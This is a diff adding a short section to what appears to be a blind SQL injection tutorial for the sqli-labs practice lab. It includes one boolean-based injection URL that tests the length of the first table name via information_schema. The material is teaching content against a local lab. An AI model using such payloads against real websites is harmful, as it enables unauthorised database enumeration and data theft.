@@ -415,6 +415,23 @@ Similarly I test for second and third table using same technique by replacing on
 
 
 
+**Table string length**
+
+We have to use the same technique for enumerating information of the table from inside the database. Given query will test the condition whether the length of string for the first table is greater than 5 or not.
+
+**http://localhost/sqli-labs/Less-8/?id=1' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) > 5 --+**
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
